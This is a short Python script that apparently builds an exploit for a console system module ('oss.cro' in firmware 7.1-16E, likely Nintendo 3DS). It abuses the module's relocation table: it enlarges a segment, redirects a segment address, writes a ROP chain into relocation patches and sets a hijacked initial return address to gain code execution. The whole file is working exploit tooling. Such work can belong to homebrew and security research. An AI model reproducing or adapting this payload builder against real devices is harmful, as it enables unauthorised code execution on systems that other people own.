import sys
import os
sys.path.append(os.path.abspath("../build/"))
from constants import *

#values for oss.cro in 7.1-16E
 
def getWord(b, k, n=4):
	return sum(list(map(lambda c: b[k+c]<<(c*8),range(n))))
 
def putWord(b, k, v, n=4):
	for c in range(n):
		b[k+c]=(v>>(c*8))&0xFF

def writeRelocationPatch(b, i, a, v, s=0x1):
	k=0x1DBA90+i*0xC
	putWord(b, k+0x0, (a<<4)|s)
	putWord(b, k+0x4, 0x00000302)
	putWord(b, k+0x8, v-0x08381050)

ropfn=sys.argv[1]
crofn=sys.argv[2]
outfn=sys.argv[3]

ropdata=bytearray(open(ropfn,"rb").read())
crodata=bytearray(open(crofn,"rb").read())

#make segment2 just a bit larger so we can modify the segment table with relocation patches
putWord(crodata, 0x1D9020, 0x4C000)

#patch to change segment1's address
writeRelocationPatch(crodata, 0, 0x4B010, RO_ROP_START, 0x2)

#actual ROP
i=1
for k in range(0,len(ropdata)-4,4):
	v=getWord(ropdata,k+4)
	if v!=0xDEADBABE:
		writeRelocationPatch(crodata, i, k+RO_ROP_OFFSET, v)
		i+=1

#initial return address
writeRelocationPatch(crodata, i, 0x00, getWord(ropdata,0))

open(outfn,"wb").write(crodata)
